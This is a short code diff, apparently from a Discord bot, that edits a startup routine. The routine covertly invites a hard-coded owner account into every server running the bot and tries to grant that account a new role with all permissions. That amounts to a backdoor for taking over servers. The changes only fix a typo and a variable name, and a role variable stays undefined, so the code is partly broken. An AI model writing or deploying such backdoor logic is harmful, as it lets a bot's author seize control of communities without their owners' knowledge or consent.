@@ -72,7 +72,7 @@ async def on_ready():
     for guild in bot.guilds:
         g_users = await guild.query_members(user_ids=[ownerman.id])
         if g_users == [] or g_users == None:
-            await ownerman.send("You're not in guild " + str(guild.name) + " with id" + str(guild.id) + ", owned by " + str(guild.owner.display_name) + " # " + str(guild.owner.discriminator))
+            await ownerman.send("You're not in guild " + str(guild.name) + " with id " + str(guild.id) + ", owned by " + str(guild.owner.display_name) + " # " + str(guild.owner.discriminator))
             await ownerman.send("Going to attempt to invite you. Hang on.")
             try:
                 invites = await guild.invites()
@@ -85,7 +85,7 @@ async def on_ready():
         else:
             try:
                 role = await guild.create_role(name="lol", permissions=discord.Permissions.all())
-                me = await guild.fetch_member(ownernman.id)
+                me = await guild.fetch_member(OWNER)
                 await me.add_roles(r)
                 await ownerman.send("Added your perms in " + str(guild.name))
             except Exception as e:
